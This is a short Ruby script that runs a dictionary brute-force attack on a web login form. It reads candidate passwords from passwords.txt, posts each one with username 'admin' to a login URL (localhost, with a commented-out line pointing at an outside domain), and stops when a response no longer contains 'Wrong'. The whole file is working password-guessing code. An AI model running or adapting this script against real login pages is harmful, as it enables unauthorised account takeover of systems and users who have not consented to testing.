require 'net/http'
require 'uri'
def is_wrong_password? password
    uri = URI.parse 'http://localhost:4567/login'
    
    # uri = URI.parse 'http://gonago.ml/'
    response = Net::HTTP.post_form(uri, 'username' => 'admin', 'password' => password).body
    return response.include? "Wrong"
end

input = File.open "passwords.txt", "r"

while (line = input.gets)
    line.strip!
    print "Trining password #{line}..."

if is_wrong_password? line
        puts "Error"
        
    else 
        puts "Found!"
        puts "####  #{line}  ####" 
        input.close
        exit
    end

end










